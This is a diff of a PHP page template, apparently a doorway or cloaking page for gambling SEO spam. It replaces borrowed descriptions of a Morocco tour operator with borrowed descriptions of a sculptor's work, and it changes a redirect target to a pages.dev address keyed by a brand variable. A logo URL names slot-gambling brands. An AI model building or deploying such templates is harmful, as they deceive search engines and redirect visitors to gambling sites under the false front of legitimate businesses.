@@ -62,14 +62,14 @@
         $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
         // SEO DATA (AUTO GENERATE)
-        $title = "$BRAND : Vacation Morocco Tours untuk Menjelajahi Maroko dan Gurun Sahara";
+        $title = "$BRAND : Eksplorasi Seni Patung Fantasi dan Kreativitas Artistik";
 
-        $description = "$BRAND hadir sebagai penyedia perjalanan yang berfokus pada pengalaman menjelajahi Maroko. Dari informasi yang ditampilkan pada situs resminya, layanan mereka mencakup berbagai perjalanan dari Marrakech, Fes, Casablanca, Agadir, dan Ouarzazate dengan pilihan durasi mulai dari perjalanan singkat hingga itinerary panjang.";
+        $description = "$BRAND merupakan ruang eksplorasi seni yang menampilkan karya patung dengan pendekatan visual yang unik, imajinatif, dan penuh karakter. Melalui karya-karya Miguel Contreras, seni patung menjadi media untuk mengeksplorasi bentuk, emosi, imajinasi, serta hubungan antara dunia nyata dan dunia fantasi. Situs ini menghadirkan kategori karya patung, seni suara, dan pameran yang memperlihatkan beragam cara dalam memahami ekspresi artistik.";
         
-        $artikel = "hadir sebagai penyedia perjalanan yang berfokus pada pengalaman menjelajahi Maroko. Dari informasi yang ditampilkan pada situs resminya, layanan mereka mencakup berbagai perjalanan dari Marrakech, Fes, Casablanca, Agadir, dan Ouarzazate dengan pilihan durasi mulai dari perjalanan singkat hingga itinerary panjang.";
+        $artikel = "merupakan ruang eksplorasi seni yang menampilkan karya patung dengan pendekatan visual yang unik, imajinatif, dan penuh karakter. Melalui karya-karya Miguel Contreras, seni patung menjadi media untuk mengeksplorasi bentuk, emosi, imajinasi, serta hubungan antara dunia nyata dan dunia fantasi. Situs ini menghadirkan kategori karya patung, seni suara, dan pameran yang memperlihatkan beragam cara dalam memahami ekspresi artistik.";
 
         // Bisa diganti random image atau CDN sendiri
-        $image = "https://i.pinimg.com/1200x/b7/39/f6/b739f6314d0f4b21bc6c59b968584e47.jpg";  
+        $image = "https://i.pinimg.com/1200x/e5/2a/74/e52a74cf7203c25952f1367fe27c77e5.jpg";  
 
         // Canonical URL
         $canonical = $current_url;
@@ -79,7 +79,7 @@
     }
 
     // Redirect target
-    $ampmek = "https://vacationmoroccotours.pages.dev/?id=$BRAND";
+    $ampmek = "https://machsculptures.pages.dev/?id=$BRAND";
     $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
     $favicon = "https://www.gstatic.com/search-console/scfe/favicon.png";
     ?>
